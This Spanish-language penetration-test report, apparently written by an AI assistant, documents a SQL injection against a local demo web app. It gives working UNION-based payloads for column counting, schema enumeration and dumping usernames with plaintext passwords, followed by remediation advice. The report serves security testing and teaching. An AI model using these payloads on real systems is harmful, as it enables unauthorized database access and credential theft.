# Informe de Auditoría de Seguridad - SQL Injection
**Fecha:** 2026-04-30 15:05:03  
**Objetivo:** http://web.dev.local:8083  
**Analista:** GitHub Copilot CLI  

---

## Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad **SQL Injection** de tipo **error-based / UNION-based** en el parámetro `id` del formulario de búsqueda de usuarios. La aplicación permite acceso no autorizado a toda la base de datos, incluyendo credenciales de usuarios.

---

## 1. Descripción de la Aplicación

La aplicación web presenta un formulario simple con un campo `User ID` que realiza búsquedas en una base de datos MariaDB. El formulario envía peticiones GET con los parámetros `id` y `Submit`.

- **URL:** `http://web.dev.local:8083/`
- **Método:** GET
- **Parámetro vulnerable:** `id`
- **Fichero vulnerable:** `/var/www/html/low.php` (línea 11)
- **Base de datos:** MariaDB

---

## 2. Vulnerabilidades Encontradas

### 2.1 SQL Injection - Error-Based (Confirmación)

**Severidad:** CRÍTICA  
**Parámetro:** `id`  

**Prueba:** Al introducir una comilla simple (`'`) en el parámetro `id`, la aplicación devuelve un error SQL visible:

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirma:
1. El input no está sanitizado ni parametrizado.
2. Los errores SQL se muestran al usuario (información sensible expuesta).
3. El servidor usa **MariaDB**.

---

### 2.2 SQL Injection - UNION-Based (Explotación)

**Severidad:** CRÍTICA  

#### Enumeración de columnas (ORDER BY)

| Payload | Resultado |
|---------|-----------|
| `1' ORDER BY 1-- -` | Sin error → columna 1 existe |
| `1' ORDER BY 2-- -` | Sin error → columna 2 existe |
| `1' ORDER BY 3-- -` | **Error** → solo 2 columnas |

La consulta original tiene **2 columnas**.

#### Identificación de base de datos y usuario

```
Payload: -1' UNION SELECT database(),user()-- -
```

| Campo | Valor |
|-------|-------|
| Base de datos activa | `sqli_demo` |
| Usuario de BD | `root@172.18.0.3` |

> ⚠️ La aplicación se conecta como **root**, otorgando privilegios máximos al atacante.

#### Enumeración de tablas

```
Payload: -1' UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -
```

| Tablas en `sqli_demo` |
|-----------------------|
| `users` |

#### Enumeración de columnas

```
Payload: -1' UNION SELECT GROUP_CONCAT(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -
```

Columnas: `user_id`, `first_name`, `last_name`, `username`, `password`, `email`

#### Extracción de credenciales

```
Payload: -1' UNION SELECT GROUP_CONCAT(username,0x3a,password),2 FROM users-- -
```

| Usuario | Contraseña |
|---------|------------|
| admin | password123 |
| jsmith | secret456 |
| bjohnson | mypass789 |
| awilliams | qwerty123 |
| cbrown | password |
| ddavis | secure123 |
| emiller | hackme |
| fwilson | admin123 |

> ⚠️ Las contraseñas se almacenan en **texto plano** (sin hash), lo que constituye una vulnerabilidad adicional.

---

## 3. Impacto

| Riesgo | Descripción |
|--------|-------------|
| **Confidencialidad** | Exposición total de credenciales y datos de usuarios |
| **Integridad** | El atacante puede modificar, insertar o eliminar registros |
| **Disponibilidad** | Posible eliminación de tablas/datos |
| **Escalada** | Acceso como `root` podría permitir leer ficheros del sistema (`LOAD_FILE`) |

---

## 4. Recomendaciones

1. **Usar consultas parametrizadas (prepared statements):**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   ```

2. **Nunca conectarse a la BD como `root`** — usar un usuario con privilegios mínimos.

3. **Almacenar contraseñas con hash seguro** (bcrypt, Argon2).

4. **Deshabilitar la visualización de errores en producción** (`display_errors = Off`).

5. **Implementar WAF** (Web Application Firewall) para filtrar payloads maliciosos.

6. **Validar y sanitizar el input** del usuario (solo permitir enteros para IDs).

---

## 5. Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad **SQL Injection crítica** que permite a un atacante sin autenticación extraer toda la información de la base de datos, incluyendo las credenciales de todos los usuarios en texto plano. Se recomienda corrección inmediata mediante el uso de consultas parametrizadas.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
